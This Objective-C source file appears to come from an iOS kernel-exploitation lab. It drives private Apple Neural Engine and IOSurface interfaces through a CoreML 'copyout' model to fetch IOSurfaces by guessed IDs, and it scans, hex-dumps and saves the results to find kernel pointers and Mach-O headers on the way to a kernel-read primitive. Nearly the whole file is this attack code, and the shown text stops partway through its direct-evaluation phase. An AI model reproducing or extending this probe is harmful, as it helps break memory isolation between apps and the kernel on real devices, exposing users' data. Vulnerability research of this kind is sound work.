//
//  P082AneKernelSid.m — v2 copyout dump of fetched sids. See header.
//

#import "P082AneKernelSid.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <math.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <unistd.h>

#define P082_BUILD       @"p082-dump-v2"
#define P082_MODEL_COPY  @"XVRC27_127in_copyout"
#define P082_N_IN        127u
#define P082_Y_BYTES     512u
#define P082_SURF_BYTES  0x4000u
#define P082_REPS        8u
#define P082_ENGAGE_MS   1.0
#define P082_MH_MAGIC_64 0xfeedfacfu
#define P082_MH_CIGAM_64 0xcffaedfeu

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p082_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p082_iosGetID_t)(IOSurfaceRef);
typedef IOSurfaceRef (*p082_iosLookup_t)(uint32_t);
typedef void *(*p082_iosBase_t)(IOSurfaceRef);
typedef size_t (*p082_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p082_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
} p082_surf_t;

static int g_p082_fd = -1;
static NSMutableString *g_p082_buf;
static NSString *g_p082_docs;

static void p082_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P082AneKernelSid class]) {
        if (g_p082_buf) [g_p082_buf appendString:out];
        if (g_p082_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p082_fd, s, strlen(s));
                fcntl(g_p082_fd, F_FULLFSYNC);
            }
        }
    }
}

#pragma mark - IOSurface

static p082_iosCreate_t  s_iosCreate;
static p082_iosGetID_t   s_iosGetID;
static p082_iosLookup_t  s_iosLookup;
static p082_iosBase_t    s_iosBase;
static p082_iosAllocSz_t s_iosAllocSz;
static p082_iosLock_t    s_iosLock;
static p082_iosLock_t    s_iosUnlock;

static BOOL p082_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p082_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p082_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosLookup  = (p082_iosLookup_t)dlsym(h, "IOSurfaceLookup");
    s_iosBase    = (p082_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p082_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p082_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p082_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosLookup && s_iosBase && s_iosAllocSz
           && s_iosLock && s_iosUnlock;
}

static CFNumberRef p082_cfnum_int(int v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
}
static CFNumberRef p082_cfnum_idx(size_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberCFIndexType, &v);
}

/* P044 poc geometry: w=size/4, h=1, bpr=size, bpe=4. MemoryMap size >= expected. */
static IOSurfaceRef p082_surface_poc(size_t size, uint8_t fill) {
    if (!s_iosCreate) return NULL;
    int w = (int)(size / 4), h = 1, bpe = 4;
    size_t bpr = size;
    CFNumberRef cw = p082_cfnum_int(w), ch = p082_cfnum_int(h);
    CFNumberRef cbpr = p082_cfnum_idx(bpr), cbpe = p082_cfnum_int(bpe);
    CFNumberRef cas = p082_cfnum_idx(size);
    const void *keys[] = {
        CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
        CFSTR("IOSurfaceBytesPerRow"), CFSTR("IOSurfaceBytesPerElement"),
        CFSTR("IOSurfaceAllocSize")
    };
    const void *vals[] = { cw, ch, cbpr, cbpe, cas };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 5,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(cw); CFRelease(ch); CFRelease(cbpr); CFRelease(cbpe); CFRelease(cas);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    if (!s) return NULL;
    if (s_iosLock(s, 0, NULL) == KERN_SUCCESS) {
        uint8_t *b = (uint8_t *)s_iosBase(s);
        size_t n = s_iosAllocSz(s);
        if (b && n) memset(b, fill, n);
        s_iosUnlock(s, 0, NULL);
    }
    return s;
}

static void p082_fill_u16(IOSurfaceRef s, uint16_t tile) {
    if (!s) return;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return;
    uint8_t *b = (uint8_t *)s_iosBase(s);
    size_t n = s_iosAllocSz(s);
    if (b && n >= 2) {
        for (size_t o = 0; o + 1 < n; o += 2) {
            b[o] = (uint8_t)(tile & 0xff);
            b[o + 1] = (uint8_t)(tile >> 8);
        }
    }
    s_iosUnlock(s, 0, NULL);
}

static BOOL p082_copy_out_bytes(IOSurfaceRef s, uint8_t *dst, size_t n) {
    if (!s || !dst || n == 0) return NO;
    if (s_iosLock(s, 1, NULL) != KERN_SUCCESS) return NO;
    uint8_t *b = (uint8_t *)s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    BOOL ok = (b && sz > 0);
    if (ok) memcpy(dst, b, n < sz ? n : sz);
    s_iosUnlock(s, 1, NULL);
    return ok;
}

#pragma mark - hex / fp16 / classify

static uint16_t p082_f32_to_f16(float f) {
    union { float f; uint32_t u; } v; v.f = f;
    uint32_t sign = (v.u >> 16) & 0x8000u;
    int32_t exp = (int32_t)((v.u >> 23) & 0xffu) - 127 + 15;
    uint32_t mant = v.u & 0x7fffffu;
    if (exp <= 0) return (uint16_t)sign;
    if (exp >= 31) return (uint16_t)(sign | 0x7c00u);
    return (uint16_t)(sign | ((uint32_t)exp << 10) | (mant >> 13));
}

static void p082_hexdump(const uint8_t *b, size_t n, size_t maxn) {
    size_t lim = n < maxn ? n : maxn;
    for (size_t o = 0; o < lim; o += 16) {
        char line[80];
        int p = snprintf(line, sizeof(line), "  %04zx:", o);
        size_t row = (o + 16 <= lim) ? 16 : (lim - o);
        for (size_t i = 0; i < row && p < (int)sizeof(line) - 4; i++)
            p += snprintf(line + p, sizeof(line) - (size_t)p, " %02x", b[o + i]);
        p082_log(@"%s", line);
    }
}

static void p082_write_bin(NSString *name, const void *p, size_t n) {
    if (!g_p082_docs || !p || n == 0) return;
    NSString *path = [g_p082_docs stringByAppendingPathComponent:name];
    int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd < 0) {
        p082_log(@"[-] write %@ FAILED", name);
        return;
    }
    write(fd, p, n);
    fcntl(fd, F_FULLFSYNC);
    close(fd);
    p082_log(@"[+] wrote %zu B -> Documents/%@", n, name);
}

typedef struct {
    uint32_t nKptr;
    uint32_t nMagic;
    uint32_t nZero;
    uint32_t nFp16Sid;
    uint32_t nTileCtrl;
    uint32_t nA5;
    int      magicAt0;
} p082_scan_t;

static p082_scan_t p082_scan(const uint8_t *b, size_t n,
                             const uint16_t *expectFp16, uint32_t nExp,
                             const uint16_t *ctrlTile, uint32_t nCtrl) {
    p082_scan_t s;
    memset(&s, 0, sizeof(s));
    if (!b || n < 8) return s;
    if (n >= 4) {
        uint32_t m;
        memcpy(&m, b, 4);
        if (m == P082_MH_MAGIC_64 || m == P082_MH_CIGAM_64) s.magicAt0 = 1;
    }
    for (size_t o = 0; o + 8 <= n; o += 8) {
        uint64_t q;
        memcpy(&q, b + o, 8);
        if (q == 0) s.nZero++;
        if ((q & 0xfffffff000000000ULL) == 0xfffffff000000000ULL &&
            q > 0xfffffff000000000ULL)
            s.nKptr++;
        uint32_t lo = (uint32_t)q, hi = (uint32_t)(q >> 32);
        if (lo == P082_MH_MAGIC_64 || lo == P082_MH_CIGAM_64) s.nMagic++;
        if (hi == P082_MH_MAGIC_64 || hi == P082_MH_CIGAM_64) s.nMagic++;
    }
    uint32_t nFp = (uint32_t)(n / 2);
    if (expectFp16 && nExp) {
        uint32_t lim = nFp < nExp ? nFp : nExp;
        for (uint32_t i = 0; i < lim; i++) {
            uint16_t v;
            memcpy(&v, b + (size_t)i * 2, 2);
            if (v == expectFp16[i]) s.nFp16Sid++;
        }
    }
    if (ctrlTile && nCtrl) {
        uint32_t lim = nFp < nCtrl ? nFp : nCtrl;
        for (uint32_t i = 0; i < lim; i++) {
            uint16_t v;
            memcpy(&v, b + (size_t)i * 2, 2);
            if (v == ctrlTile[i]) s.nTileCtrl++;
        }
    }
    for (size_t o = 0; o + 1 < n; o += 2) {
        if (b[o] == 0xa5 && b[o + 1] == 0xa5) s.nA5++;
    }
    return s;
}

static NSString *p082_class_name(p082_scan_t sc, uint32_t nExp) {
    if (sc.magicAt0) return @"IOMD_MAYBE_TEXT (MH_MAGIC at +0 — still not hasKread)";
    if (sc.nKptr >= 2) return @"IOMD_KPTR (live global surface leak — not kread32(kbase))";
    if (nExp && sc.nFp16Sid * 2 >= nExp) return @"VALUE_ECHO (espresso copied x_i, not IOMD pixels)";
    if (sc.nTileCtrl >= 8) return @"DIRECT_IDENTITY (ANE DMA'd OUR input tiles)";
    if (sc.nA5 >= 64) return @"CONTENT_READ_OURS (0xA5 tiles — ANE read OUR wired surfaces)";
    if (sc.nZero * 8 >= (P082_Y_BYTES * 3) / 4) return @"ZEROS (empty / other-task cleared surface)";
    return @"GRAPHICS_OR_OTHER (another task IOSurface, or mixed)";
}

#pragma mark - CoreML

static NSURL *p082_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p082_load(NSURL *url, MLComputeUnits units, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = units;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

static MLDictionaryFeatureProvider *p082_provider_values(const double *vals, uint32_t nIn,
                                                         NSError **errOut) {
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < nIn; i++) {
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                   dataType:MLMultiArrayDataTypeDouble
                                                      error:nil];
        if (!m) return nil;
        m[0] = @(vals[i]);
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

/* Predict copyout. y is Float16[256] = 512 bytes. Returns YES if y copied. */
static BOOL p082_predict_copyout(MLModel *model, MLDictionaryFeatureProvider *fp,
                                 uint8_t *ybuf, size_t ycap,
                                 NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    if (dur) *dur = t1 - t0;
    if (!pred) return NO;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    if (!ya) return NO;
    const void *p = ya.dataPointer;
    NSInteger nbytes = ya.count;
    /* copyout y is Float16[256]. Default 2 B/elem; widen if CoreML promotes. */
    size_t elem = 2;
    if (ya.dataType == MLMultiArrayDataTypeFloat32) elem = 4;
    else if (ya.dataType == MLMultiArrayDataTypeDouble) elem = 8;
    static int s_yShapeLogged;
    if (!s_yShapeLogged) {
        s_yShapeLogged = 1;
        p082_log(@"    y dtype=%ld count=%ld elem=%zu raw=%zu",
                 (long)ya.dataType, (long)nbytes, elem, (size_t)nbytes * elem);
    }
    size_t raw = (size_t)nbytes * elem;
    if (p && raw > 0 && ybuf && ycap) {
        size_t n = raw < ycap ? raw : ycap;
        memcpy(ybuf, p, n);
        if (n < ycap) memset(ybuf + n, 0, ycap - n);
        return YES;
    }
    return NO;
}

static uint32_t p082_lookup_census(uint32_t lo, uint32_t hi, const char *tag) {
    uint32_t hits = 0;
    for (uint32_t sid = lo; sid <= hi; sid++) {
        IOSurfaceRef f = s_iosLookup(sid);
        if (f) {
            hits++;
            size_t sz = s_iosAllocSz(f);
            uint8_t peek[16];
            memset(peek, 0, sizeof(peek));
            BOOL got = p082_copy_out_bytes(f, peek, sizeof(peek));
            p082_log(@"[*] %s LOOKUP HIT sid=%u size=%zu peek=%s %02x %02x %02x %02x %02x %02x %02x %02x",
                     tag, sid, sz, got ? "yes" : "no",
                     peek[0], peek[1], peek[2], peek[3],
                     peek[4], peek[5], peek[6], peek[7]);
            CFRelease(f);
        }
    }
    p082_log(@"[*] %s Lookup %u..%u hits=%u (NULL = per-task registry; fetch is global)",
             tag, lo, hi, hits);
    return hits;
}

#pragma mark - Direct (_ANEClient wrap — pixel DMA)

static id p082_direct_load(NSURL *url, uint64_t *handleOut) {
    dlopen("/System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine",
           RTLD_NOW | RTLD_GLOBAL);
    Class Model = NSClassFromString(@"_ANEModel");
    Class Client = NSClassFromString(@"_ANEClient");
    if (!Model || !Client || !url) {
        p082_log(@"[-] Direct _ANEModel/_ANEClient/url missing");
        return nil;
    }
    id model = ((id (*)(id, SEL, id, id, id, id))objc_msgSend)(
        Model, NSSelectorFromString(@"modelAtURLWithSourceURL:sourceURL:key:cacheURLIdentifier:"),
        url, url, @"p082", @"p082");
    if (!model) {
        p082_log(@"[-] Direct _ANEModel create nil");
        return nil;
    }
    id client = ((id (*)(id, SEL))objc_msgSend)(Client, NSSelectorFromString(@"sharedConnection"));
    if (!client) {
        p082_log(@"[-] Direct sharedConnection nil");
        return nil;
    }
    NSError *err = nil;
    SEL compileSel = NSSelectorFromString(@"compileModel:options:qos:error:");
    SEL loadSel = NSSelectorFromString(@"doLoadModel:options:qos:error:");
    if ([client respondsToSelector:compileSel])
        ((BOOL (*)(id, SEL, id, id, unsigned, NSError **))objc_msgSend)(
            client, compileSel, model, @{}, 2, &err);
    if ([client respondsToSelector:loadSel])
        ((BOOL (*)(id, SEL, id, id, unsigned, NSError **))objc_msgSend)(
            client, loadSel, model, @{}, 2, &err);
    uint64_t h = 0;
    SEL phSel = NSSelectorFromString(@"programHandle");
    if ([model respondsToSelector:phSel])
        h = ((unsigned long long (*)(id, SEL))objc_msgSend)(model, phSel);
    p082_log(@"[*] Direct programHandle=0x%llx err=%@ (%s)",
             (unsigned long long)h, err.localizedDescription ?: @"ok",
             h ? "armed" : "handle=0");
    if (handleOut) *handleOut = h;
    if (!h) return nil;
    /* stash client on the model via associated object? just return @{model,client} */
    objc_setAssociatedObject(model, "p082.client", client, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    return model;
}

static BOOL p082_direct_fire(id model, NSArray *inObjs, NSArray *inIdx,
                             id outObj, IOSurfaceRef outSurf,
                             uint8_t *ybuf, size_t ycap, NSTimeInterval *dur) {
    Class reqCls = NSClassFromString(@"_ANERequest");
    if (!reqCls || !model) return NO;
    id client = objc_getAssociatedObject(model, "p082.client");
    if (!client) return NO;
    id req = ((id (*)(id, SEL, id, id, id, id, id))objc_msgSend)(
        reqCls,
        NSSelectorFromString(@"requestWithInputs:inputIndices:outputs:outputIndices:procedureIndex:"),
        inObjs, inIdx, @[ outObj ], @[ @0 ], @0);
    if (!req) {
        p082_log(@"[-] Direct _ANERequest nil");
        return NO;
    }
    SEL fireSel = NSSelectorFromString(@"doEvaluateDirectWithModel:options:request:qos:error:");
    if (![client respondsToSelector:fireSel]) {
        p082_log(@"[-] Direct fire selector missing");
        return NO;
    }
    NSError *err = nil;
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    BOOL ok = ((BOOL (*)(id, SEL, id, id, id, unsigned, NSError **))objc_msgSend)(
        client, fireSel, model, @{}, req, 2, &err);
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    if (dur) *dur = t1 - t0;
    p082_log(@"[*] Direct doEvaluateDirectWithModel ok=%d t=%.2fms err=%@",
             ok, (t1 - t0) * 1000.0, err.localizedDescription ?: @"<nil>");
    if (ybuf && ycap && outSurf)
        p082_copy_out_bytes(outSurf, ybuf, ycap);
    return ok;
}

static id p082_wrap(IOSurfaceRef s) {
    Class surfCls = NSClassFromString(@"_ANEIOSurfaceObject");
    if (!surfCls || !s) return nil;
    return ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(
        surfCls, NSSelectorFromString(@"objectWithIOSurface:"), s);
}

#pragma mark -

static void p082_finish(p082_surf_t *ins, uint32_t nIn, IOSurfaceRef outS) {
    if (ins) {
        for (uint32_t i = 0; i < nIn; i++) if (ins[i].surf) CFRelease(ins[i].surf);
        free(ins);
    }
    if (outS) CFRelease(outS);
    if (g_p082_fd >= 0) { fcntl(g_p082_fd, F_FULLFSYNC); close(g_p082_fd); g_p082_fd = -1; }
}

static NSString *p082_return(void) {
    NSString *ret = g_p082_buf;
    g_p082_buf = nil;
    return ret;
}

@implementation P082AneKernelSid

+ (NSString *)tap {
    g_p082_buf = [NSMutableString string];
    g_p082_docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [g_p082_docs stringByAppendingPathComponent:@"p082_ane_kernelsid_log.txt"];
    g_p082_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p082_log(@"=== p082 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P082_BUILD);
    p082_log(@"DUMP TAP: in-bounds 127-in copyout, x_i = sid, output = OUR surface.");
    p082_log(@"  0xfffffff0… = leak of that IOMD (live global surface).");
    p082_log(@"  graphics/zeros = another task's IOSurface.");
    p082_log(@"  fp16(sid) = VALUE_ECHO (P080 READ DOOR still dead on this binding).");
    p082_log(@"  kread32(kbase)==0xfeedfacf ONLY if that backing is kernel TEXT.");
    p082_log(@"  127+1=128 records so MemoryMap consumes. Fetch wrapper 0x9867f18");
    p082_log(@"  is global (surface+0x3c0 bit19). Lookup of sid 1 is task-scoped.");
    p082_log(@"PANIC POSSIBLE (kernel/boot IOMD DART-mapped as ANE input).");
    p082_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p082"];
    if (stop) {
        p082_log(@"%@", stop);
        p082_finish(NULL, 0, NULL);
        return p082_return();
    }
    p082_log(@"%@", [LabDeviceProfile identBlock]);

    if (!p082_resolve_iosurface()) {
        p082_log(@"[-] IOSurface dlsym FAILED");
        p082_log(@"=== VERDICT === abort (iosurface). hasKread=NO.");
        p082_finish(NULL, 0, NULL);
        return p082_return();
    }

    /* optional Documents/p082_sids.txt = comma/space list, else 1..127 */
    uint32_t dumpSids[P082_N_IN];
    uint32_t nDump = P082_N_IN;
    for (uint32_t i = 0; i < P082_N_IN; i++) dumpSids[i] = i + 1;
    {
        NSString *sp = [g_p082_docs stringByAppendingPathComponent:@"p082_sids.txt"];
        NSString *txt = [NSString stringWithContentsOfFile:sp encoding:NSUTF8StringEncoding error:nil];
        if (txt.length) {
            NSCharacterSet *sep = [NSCharacterSet characterSetWithCharactersInString:@", \n\t"];
            NSArray *parts = [txt componentsSeparatedByCharactersInSet:sep];
            uint32_t n = 0;
            for (NSString *p in parts) {
                if (p.length == 0) continue;
                unsigned long v = strtoul(p.UTF8String, NULL, 0);
                if (v > 0 && v < 0x1000000ul && n < P082_N_IN)
                    dumpSids[n++] = (uint32_t)v;
            }
            if (n) {
                nDump = n;
                while (nDump < P082_N_IN) {
                    dumpSids[nDump] = dumpSids[nDump - 1];
                    nDump++;
                }
                p082_log(@"[+] p082_sids.txt override first=%u last_unique consumed, padded to 127",
                         dumpSids[0]);
                unlink(sp.fileSystemRepresentation);
            }
        }
    }

    NSURL *copyURL = p082_model_url(P082_MODEL_COPY);
    if (!copyURL) {
        p082_log(@"[-] %@ missing from bundle", P082_MODEL_COPY);
        p082_log(@"=== VERDICT === abort (model). hasKread=NO.");
        p082_finish(NULL, 0, NULL);
        return p082_return();
    }

    NSError *err = nil;
    MLModel *modelAll = p082_load(copyURL, MLComputeUnitsAll, &err);
    if (!modelAll) {
        p082_log(@"[-] load copyout All FAILED: %@", err.localizedDescription ?: @"-");
        p082_log(@"=== VERDICT === abort (load). hasKread=NO.");
        p082_finish(NULL, 0, NULL);
        return p082_return();
    }
    MLModel *modelCpu = p082_load(copyURL, MLComputeUnitsCPUOnly, &err);
    p082_log(@"[+] copyout loaded (All); cpuOnly twin %@", modelCpu ? @"loaded" : @"FAILED");

    /* OUR 127 inputs (0xA5 tiles) + 1 output. Record sid = GetID on Direct.
       CoreML uses int(x_i) as record sid — we feed those GetIDs as CONTROL. */
    p082_surf_t *ins = calloc(P082_N_IN, sizeof(p082_surf_t));
    if (!ins) {
        p082_log(@"[-] calloc FAILED");
        p082_finish(NULL, 0, NULL);
        return p082_return();
    }
    uint32_t made = 0;
    for (uint32_t i = 0; i < P082_N_IN; i++) {
        IOSurfaceRef s = p082_surface_poc(P082_SURF_BYTES, 0xa5);
        if (!s) continue;
        ins[made].surf = s;
        ins[made].sid = s_iosGetID(s);
        p082_fill_u16(s, 0xa5a5);
        made++;
    }
    IOSurfaceRef outS = p082_surface_poc(P082_SURF_BYTES, 0x00);
    uint32_t outSid = outS ? s_iosGetID(outS) : 0;
    p082_log(@"[+] OUR inputs %u/%u sids %u..%u (0xA5 tile); output sid=%u size=%zu",
             made, P082_N_IN,
             made ? ins[0].sid : 0, made ? ins[made - 1].sid : 0,
             outSid, outS ? s_iosAllocSz(outS) : 0);
    if (made < P082_N_IN || !outS) {
        p082_log(@"[-] need 127 inputs + output — abort");
        p082_log(@"=== VERDICT === abort (surfaces). hasKread=NO.");
        p082_finish(ins, made, outS);
        return p082_return();
    }

    double ownSids[P082_N_IN];
    uint16_t ownFp16[P082_N_IN];
    uint16_t dumpFp16[P082_N_IN];
    uint16_t dirTile[P082_N_IN];
    for (uint32_t i = 0; i < P082_N_IN; i++) {
        ownSids[i] = (double)ins[i].sid;
        ownFp16[i] = p082_f32_to_f16((float)ins[i].sid);
        dumpFp16[i] = p082_f32_to_f16((float)dumpSids[i]);
        dirTile[i] = (uint16_t)(0xa000u + i);
    }

    p082_log(@"--- Lookup census BEFORE (sid 1..127) ---");
    uint32_t hitBefore = p082_lookup_census(1, 127, "pre");

    /* ---- GATE ---- */
    err = nil;
    MLDictionaryFeatureProvider *fpOwn = p082_provider_values(ownSids, P082_N_IN, &err);
    if (!fpOwn) {
        p082_log(@"[-] provider OWN FAILED");
        p082_log(@"=== VERDICT === abort (provider). hasKread=NO.");
        p082_finish(ins, made, outS);
        return p082_return();
    }
    p082_log(@"--- PHASE G: engagement (copyout, x_i = OUR sids) ---");
    uint8_t yGate[P082_Y_BYTES];
    memset(yGate, 0, sizeof(yGate));
    NSTimeInterval d = 0, minAll = 1e9, minCpu = 1e9;
    BOOL gateOk = NO;
    for (uint32_t r = 0; r < P082_REPS; r++) {
        err = nil;
        BOOL ok = p082_predict_copyout(modelAll, fpOwn, yGate, sizeof(yGate), &d, &err);
        if (ok) gateOk = YES;
        if (d < minAll) minAll = d;
    }
    if (modelCpu) {
        for (uint32_t r = 0; r < P082_REPS; r++) {
            uint8_t tmp[P082_Y_BYTES];
            err = nil;
            p082_predict_copyout(modelCpu, fpOwn, tmp, sizeof(tmp), &d, &err);
            if (d < minCpu) minCpu = d;
        }
    }
    BOOL engaged = modelCpu && (minAll > minCpu + P082_ENGAGE_MS / 1000.0);
    p082_log(@"[*] GATE ok=%d minAll=%.2fms minCpu=%.2fms -> ANE %s",
             gateOk, minAll * 1000.0, minCpu * 1000.0,
             engaged ? "ENGAGED" : "NOT ENGAGED");
    if (!engaged) {
        p082_log(@"=== VERDICT === ANE not engaged — rerun fresh boot. hasKread=NO.");
        p082_finish(ins, made, outS);
        return p082_return();
    }

    /* ---- D-CTL CoreML: x_i = OUR sids, surfaces tiled 0xA5. Differential. ---- */
    p082_log(@"--- PHASE D-CTL: CoreML copyout x_i=OUR sids (0xA5 tiles on those surfaces) ---");
    p082_scan_t scCtl = p082_scan(yGate, sizeof(yGate), ownFp16, P082_N_IN, NULL, 0);
    p082_log(@"[*] D-CTL class=%@", p082_class_name(scCtl, P082_N_IN));
    p082_log(@"    kptr=%u magic=%u magicAt0=%d fp16sid=%u/127 a5=%u zeroQ=%u",
             scCtl.nKptr, scCtl.nMagic, scCtl.magicAt0, scCtl.nFp16Sid, scCtl.nA5, scCtl.nZero);
    p082_log(@"    first 64 B of CONTROL y:");
    p082_hexdump(yGate, sizeof(yGate), 64);
    p082_write_bin(@"p082_ctl.bin", yGate, sizeof(yGate));

    /* ---- D-FETCH CoreML: x_i = dump sids (default 1..127) ---- */
    p082_log(@"--- PHASE D-FETCH: CoreML copyout x_i=sid %u.. (in-bounds 128 records) ---",
             dumpSids[0]);
    double dumpVals[P082_N_IN];
    for (uint32_t i = 0; i < P082_N_IN; i++) dumpVals[i] = (double)dumpSids[i];
    err = nil;
    MLDictionaryFeatureProvider *fpDump = p082_provider_values(dumpVals, P082_N_IN, &err);
    uint8_t yDump[P082_Y_BYTES];
    memset(yDump, 0, sizeof(yDump));
    BOOL dumpOk = NO;
    if (fpDump) {
        err = nil;
        dumpOk = p082_predict_copyout(modelAll, fpDump, yDump, sizeof(yDump), &d, &err);
        p082_log(@"[*] D-FETCH ok=%d t=%.2fms err=%@",
                 dumpOk, d * 1000.0, err.localizedDescription ?: @"none");
    } else {
        p082_log(@"[-] D-FETCH provider FAILED");
    }
    p082_scan_t scDump = p082_scan(yDump, sizeof(yDump), dumpFp16, P082_N_IN, NULL, 0);
    p082_log(@"[*] D-FETCH class=%@", p082_class_name(scDump, P082_N_IN));
    p082_log(@"    kptr=%u magic=%u magicAt0=%d fp16sid=%u/127 a5=%u zeroQ=%u",
             scDump.nKptr, scDump.nMagic, scDump.magicAt0, scDump.nFp16Sid, scDump.nA5, scDump.nZero);
    p082_log(@"    first 64 B of FETCH y (the dump):");
    p082_hexdump(yDump, sizeof(yDump), 64);
    p082_log(@"    last 32 B:");
    if (sizeof(yDump) >= 32)
        p082_hexdump(yDump + sizeof(yDump) - 32, 32, 32);
    p082_write_bin(@"p082_dump.bin", yDump, sizeof(yDump));
    {
        /* qword view — leak oracle */
        for (size_t o = 0; o + 8 <= 64 && o + 8 <= sizeof(yDump); o += 8) {
            uint64_t q;
            memcpy(&q, yDump + o, 8);
            p082_log(@"    y+0x%02zx = 0x%016llx%s", o, (unsigned long long)q,
                     ((q & 0xfffffff000000000ULL) == 0xfffffff000000000ULL) ? "  KPTR" : "");
        }
    }

    /* ---- D-SID1: all x_i = first dump sid (127 copies of one IOMD's first tile) ---- */
    p082_log(@"--- PHASE D-SID1: all x_i = %u (127 copies of one fetched object) ---", dumpSids[0]);
    double oneVals[P082_N_IN];
    uint16_t oneFp16[P082_N_IN];
    for (uint32_t i = 0; i < P082_N_IN; i++) {
        oneVals[i] = (double)dumpSids[0];
        oneFp16[i] = p082_f32_to_f16((float)dumpSids[0]);
    }
    uint8_t yOne[P082_Y_BYTES];
    memset(yOne, 0, sizeof(yOne));
    err = nil;
    MLDictionaryFeatureProvider *fpOne = p082_provider_values(oneVals, P082_N_IN, &err);
    BOOL oneOk = NO;
    if (fpOne) {
        err = nil;
        oneOk = p082_predict_copyout(modelAll, fpOne, yOne, sizeof(yOne), &d, &err);
        p082_log(@"[*] D-SID1 ok=%d t=%.2fms err=%@",
                 oneOk, d * 1000.0, err.localizedDescription ?: @"none");
    }
    p082_scan_t scOne = p082_scan(yOne, sizeof(yOne), oneFp16, P082_N_IN, NULL, 0);
    p082_log(@"[*] D-SID1 class=%@", p082_class_name(scOne, P082_N_IN));
    p082_log(@"    kptr=%u magic=%u magicAt0=%d fp16sid=%u/127 zeroQ=%u",
             scOne.nKptr, scOne.nMagic, scOne.magicAt0, scOne.nFp16Sid, scOne.nZero);
    p082_hexdump(yOne, sizeof(yOne), 32);
    p082_write_bin(@"p082_sid1.bin", yOne, sizeof(yOne));

    p082_log(@"--- Lookup census AFTER fetch (sid 1..127) ---");
    uint32_t hitAfter = p082_lookup_census(1, 127, "post");
    if (hitAfter > hitBefore)
        p082_log(@"[!] post-fetch Lookup gained hits — ANE retain published into OUR registry");

    /* ---- D-DIR CONTROL: wrap OUR surfaces, unique tiles, pixel DMA ---- */
    p082_log(@"--- PHASE D-DIR: Direct wrap OUR 127 inputs, unique tiles, copyout to OUR output ---");
    uint64_t ph = 0;
    id aneModel = p082_direct_load(copyURL, &ph);
    uint8_t yDir[P082_Y_BYTES];
    memset(yDir, 0, sizeof(yDir));
    BOOL dirOk = NO;
    p082_scan_t scDir;
    memset(&scDir, 0, sizeof(scDir));
    if (aneModel) {
        Class surfCls = NSClassFromString(@"_ANEIOSurfaceObject");
        if (!surfCls) {
            p082_log(@"[-] _ANEIOSurfaceObject missing");
        } else {
            NSMutableArray *inObjs = [NSMutableArray arrayWithCapacity:P082_N_IN];
            NSMutableArray *inIdx = [NSMutableArray arrayWithCapacity:P082_N_IN];
            for (uint32_t i = 0; i < P082_N_IN; i++) {
